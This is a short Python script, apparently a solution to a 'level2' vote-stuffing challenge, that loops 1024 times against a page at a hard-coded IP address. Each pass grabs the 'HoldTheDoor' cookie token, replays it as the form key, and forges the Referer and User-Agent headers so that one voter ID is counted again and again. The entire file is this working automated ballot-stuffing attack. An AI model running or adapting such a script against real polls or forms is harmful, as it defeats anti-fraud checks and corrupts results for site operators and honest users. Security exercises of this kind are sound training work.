#!/usr/bin/python3

import requests

"""Python send POST with header"""

host = "http://158.69.76.135/level2.php"

for i in range(1024):
    response = requests.get('http://158.69.76.135/level2.php')
    header = {
        "Referer": "http://158.69.76.135/level2.php",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0WOW64 rv: 44.0) Gecko/20100101 Firefox/44.0",
    }
    payload = {'id': '1528', 'holdthedoor': 'submit',
               'key': response.cookies['HoldTheDoor']}
    cookies = {'HoldTheDoor': response.cookies['HoldTheDoor']}
    req = requests.post(host, payload, headers=header, cookies=cookies)

